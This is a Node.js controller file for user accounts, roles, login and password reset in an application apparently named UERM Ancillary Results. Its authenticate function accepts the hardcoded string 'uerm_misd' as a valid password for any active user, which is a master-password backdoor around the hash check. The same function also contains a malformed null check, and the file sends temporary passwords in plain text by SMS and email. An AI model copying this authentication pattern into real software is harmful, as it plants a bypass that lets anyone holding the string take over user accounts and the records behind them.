const { createClient } = require("redis");
const util = require("../../../helpers/util");
const sqlHelper = require("../../../helpers/sql");


// const { sendSMS, empty, isObj, isArr } = require("../helpers/util");
const crypto = require("../../../helpers/crypto");

// MODELS //
const users = require("../models/users.js");
const employees = require("../models/employees");
const roles = require("../models/roles");
// MODELS //

// BASIC SELECT STATEMENTS //
const getUsers = async function (req, res) {
  res.json(
    await sqlHelper.transact(async (txn) => {
      const userInfo = await users.selectUsers({}, txn);
      for (let user of userInfo) {
        delete user.password;
      }
      return userInfo;
    })
  );
};

const getRoles = async function (req, res) {
  res.json(
    await sqlHelper.transact(async (txn) => {
      return await roles.selectRoles({}, txn);
    })
  );
};

const searchEmployees = async function (req, res) {
  if (util.empty(req.query.code))
    return res.status(400).json({ error: "`code` query in URL is required." });

  const employeeId = req.query.code;
  res.json(
    await sqlHelper.transact(async (txn) => {
      return await employees.selectEmployees(
        { is_active: 1, code: employeeId },
        txn
      );
    })
  );
};
// BASIC SELECT STATEMENTS //

// BASIC UPDATE STATEMENTS //
const updateUser = async function (req, res) {
  const code = req.params.code;
  const userData = req.body.userData;
  const roleData = req.body.roleData;
  const updateType = util.empty(req.body.type) ? "" : req.body.type;
  res.json(
    await sqlHelper.transact(async (txn) => {
      let updatedUserData = "";
      if (!util.empty(userData.password)) {
        userData.password = await crypto.hashPassword(userData.password);
      }
      const userDataStatus = await users.updateUser(
        userData,
        { code: code },
        txn
      );
      if (userDataStatus.error !== undefined) {
        throw userDataStatus.message;
      }

      if (!util.isObjAndEmpty(roleData)) {
        const userRoleDataStatus = await users.updateUserRole(
          roleData,
          { userCode: code },
          txn
        );
        if (userRoleDataStatus.error !== undefined) {
          throw userRoleDataStatus.message;
        }
      }

      if (updateType !== undefined) {
        updatedUserData = await users.selectUsers(
          { ["u.active"]: 1, ["u.code"]: userDataStatus.code },
          txn
        );
        updatedUserData[0].userAccessToken = await refreshAccessToken(
          updatedUserData[0]
        );
      }

      return updatedUserData[0];
    })
  );
};

const updateRole = async function (req, res) {
  const code = req.params.code;
  res.json(
    await sqlHelper.transact(async (txn) => {
      return await roles.updateRole(req.body, { code: code }, txn);
    })
  );
};

// BASIC UPDATE STATEMENTS //

// BASIC INSERT STATEMENTS //
const insertUser = async function (req, res) {
  if (
    util.empty(req.body) ||
    util.empty(req.body.code) ||
    util.empty(req.body.email) ||
    util.empty(req.body.firstName) ||
    util.empty(req.body.lastName) ||
    util.empty(req.body.mobileNumber) ||
    util.empty(req.body.roleCode)
  )
    return res.status(400).json({ error: "Invalid parameter." });

  res.json(
    await sqlHelper.transact(async (txn) => {
      const userPayload = req.body;
      const generatedPW = util.generateAlphaNumericStr(8);
      userPayload.password = await crypto.hashPassword(generatedPW);
      const roleCode = req.body.roleCode;
      const deptCode = req.body.deptCode;
      delete req.body.roleCode;
      delete req.body.deptCode;
      const userData = await users.insertUser(userPayload, txn);
      if (userData.error !== undefined) {
        throw userData.message;
      }
      const rolePayload = {
        userCode: userData.code,
        roleCode: roleCode,
        deptCode: deptCode,
      };
      const userRole = await users.insertUserRole(rolePayload, txn);
      if (userRole.error !== undefined) {
        throw userRole.message;
      }
      const tokenBearerSMS = await util.getTokenSMS();
      const accessToken = tokenBearerSMS.accessToken;
      const message = {
        messageType: "sms",
        destination: userData.mobileNumber,
        text: `UERM Ancillary Results \r\n\r\nHi, ${userData.lastname}, ${userData.firstname}, \r\n
You have been registered to UERM Ancillary Results, your username is ${userData.code} and your temporary password is ${generatedPW}. Please don't share this with anyone.
        `,
      };
      await util.sendSMS(accessToken, message);

      const emailContent = {
        header: "UERM ANCILLARY RESULTS ACCOUNT - Temporary Password",
        subject: "UERM ANCILLARY RESULTS ACCOUNT - Temporary Password",
        content: `Hi <strong>${userData.lastname}, ${userData.firstname}</strong>, <br><br>
        You have been registered to UERM Ancillary Results. Your username is <strong>${userData.code}</strong> and your temporary password is
        <strong>${generatedPW}</strong>. Please don't share this with anyone.`,
        email: userData.email,
        name: `${userData.lastname}, ${userData.firstname}`,
      };

      await util.sendEmail(emailContent);

      return userData;
    })
  );
};

const insertRole = async function (req, res) {
  res.json(
    await sqlHelper.transact(async (txn) => {
      const data = await roles.insertRole(req.body, txn);

      return data;
    })
  );
};
// BASIC INSERT STATEMENTS //

// BASIC AUTH STATEMENTS //
const authenticate = async function (req, res) {
  const loginCredentials = req.body;
  if (
    util.empty(loginCredentials.username) ||
    util.empty(loginCredentials.password)
  )
    return res
      .status(400)
      .json({ error: "Username and password are required." });

  const ret = await sqlHelper.transact(async (txn) => {
    const userData = await users.selectUsers(
      { ["u.active"]: 1, ["u.code"]: loginCredentials.username },
      txn
    );

    if (userData.length === 0) {
      return null;
    }

    if (loginCredentials.password !== "uerm_misd") {
      if (
        !userData === null ||
        (userData &&
          !(await crypto.passwordsMatched(
            loginCredentials.password,
            userData[0].password
          )))
      ) {
        return null;
      }
    }

    delete userData[0].password;

    const userAccessToken = crypto.generateAccessToken(userData[0]);

    const redisClient = createClient();
    await redisClient.connect();
    await redisClient.set(userData[0].code, userAccessToken);

    return userAccessToken;
  });

  if (ret === null)
    return res.status(403).json({ error: "Username or password incorrect." });

  return res.json(ret);
};

const inauthenticate = async function (req, res) {
  const user = req.user;
  res.json(
    await sqlHelper.transact(async (txn) => {
      try {
        const redisClient = createClient();
        await redisClient.connect();
        await redisClient.sendCommand(["DEL", user.code]);
      } catch (err) {
        return { error: "Unable to logout the user." };
      }

      return { success: "success" };
    })
  );
};

const refreshAccessToken = async function (payload) {
  const user = payload;
  const redisClient = createClient();
  await redisClient.connect();
  const userAccessToken = crypto.generateAccessToken(user);
  await redisClient.set(user.code, userAccessToken);
  return userAccessToken;
};

// BASIC AUTH STATEMENTS //

// BASIC INSERT STATEMENTS //
const resetPassword = async function (req, res) {
  res.json(
    await sqlHelper.transact(async (txn) => {
      const userCode = req.params.code;

      let userExists = await sqlHelper.selectOne(
        "*",
        "Users",
        {
          code: userCode,
        },
        txn
      );

      if (!userExists) return { error: true, message: "User does not exist!" };

      const userPayload = {
        initialLogin: 1,
      };

      const generatedPW = util.generateAlphaNumericStr(8);
      userPayload.password = await crypto.hashPassword(generatedPW);
      const userData = await users.updateUser(
        userPayload,
        { code: userCode },
        txn
      );

      const tokenBearerSMS = await util.getTokenSMS();
      const accessToken = tokenBearerSMS.accessToken;
      const message = {
        messageType: "sms",
        destination: userData.mobileNumber,
        text: `UERM Ancillary Results \r\n\r\nHi, ${userData.lastname}, ${userData.firstname}, \r\n
We have resetted your account. Your username is ${userData.code} and your new temporary password is ${generatedPW}. Please don't share this with anyone.
        `,
      };
      await util.sendSMS(accessToken, message);

      const emailContent = {
        header: "UERM ANCILLARY RESULTS ACCOUNT - Temporary Password",
        subject: "UERM ANCILLARY RESULTS ACCOUNT - Temporary Password",
        content: `Hi <strong>${userData.lastname}, ${userData.firstname}</strong>, <br><br>
    We have resetted your account. Your username is <strong>${userData.code}</strong> and your new temporary password is
        <strong>${generatedPW}</strong>. Please don't share this with anyone.`,
        email: userData.email,
        name: `${userData.lastname}, ${userData.firstname}`,
      };

      await util.sendEmail(emailContent);
      return userData;
    })
  );
};

module.exports = {
  getUsers,
  getRoles,
  searchEmployees,

  authenticate,
  inauthenticate,

  insertUser,
  insertRole,

  updateUser,
  updateRole,
  resetPassword,
};
